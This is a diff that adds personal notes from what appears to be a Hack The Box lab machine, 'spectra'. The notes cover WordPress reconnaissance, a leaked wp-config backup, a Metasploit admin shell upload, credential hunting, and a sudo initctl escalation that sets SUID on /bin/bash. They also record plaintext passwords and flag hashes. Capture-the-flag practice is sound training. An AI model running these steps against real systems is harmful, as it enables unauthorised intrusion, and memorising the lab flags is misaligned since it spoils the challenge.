@@ -1,0 +1,85 @@
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+80/tcp   open  http    nginx 1.17.4
+3306/tcp open  mysql   MySQL (unauthorized)
+
+Jira is being set up by IT for issue tracking
+
+spectra.htb/main/
+	Running wordpress
+	Has xmlrpc
+	WordPress version 5.4.2 identified (Insecure, released on 2020-06-10)
+	(from WPScan)
+	Sample Page:
+		bike messenger by day
+	aspiring actor by night 
+	Los Angeles
+	dog named Jack
+	likes pina coladas
+	USERS: 	administrator:devteam01
+				
+
+Using ZAP to spider
+
+
+spectra.htb/testing/
+	Running wordpress
+	Xmlrpc?
+	Lmfao wget spectra.htb/testing/wp-config.php.save
+	You're fucking kidding me lmfao
+=====================
+devtest:devteam01
+=====================
+
+	
+mysql:
+	appears to be unreachable at the moment (from web app)
+
+Logged in as "administrator" on wordpress
+Used mfconsole exploit/unix/webapp/wp_admin_shell_upload
+Meterpreter session:
+	User: nginx
+
+grep -rnw '/opt' -e 'katie'
+/opt/google/chrome/resources/chromeos/accessibility/accessibility_common/autoclick/autoclick.js:95:    // TODO(katie): Add a property to FocusRingInfo to set FocusRingBehavior
+/opt/google/chrome/resources/chromeos/accessibility/select_to_speak/select_to_speak.js:172:      // TODO(katie): Determine if this work-around needs to be ARC++ only. If
+/opt/google/chrome/resources/chromeos/accessibility/select_to_speak/select_to_speak.js:231:    // TODO(katie): We go into these blocks but they feel redundant. Can
+/opt/google/chrome/resources/chromeos/accessibility/select_to_speak/select_to_speak.js:751:      // TODO(katie): For something like a date, the start and end
+/opt/google/chrome/resources/chromeos/accessibility/select_to_speak/node_utils.js:294:    // TODO(katie): Since we only have non-text nodes or nodes without children,
+
+/main/wp-config.php:
+	Credentials: dev:development01
+
+/opt/autologin.conf.orig:
+	# Read password from file. The file may optionally end with a newline.
+  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin;
+
+/etc/autologin/passwd:SummerHereWeCome!!
+
+katie:SummerHereWeCome!!
+user hash:
+	e89d27fe195e9114ffa72ba8913a6130
+
+Katie has sudo for /etc/initctl
+https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9
+
+check /sbin/init
+
+sudo /sbin/initctl list
+
+see test events are waiting
+
+edit test*.conf to be:
+======
+script
+	chmod +s /bin/bash
+end script
+=====
+
+sudo /sbin/initctl start test*
+
+/bin/bash -p
+
+bam you're root
+
+root hash:
+d44519713b889d5e1f9e536d0c6df2fc
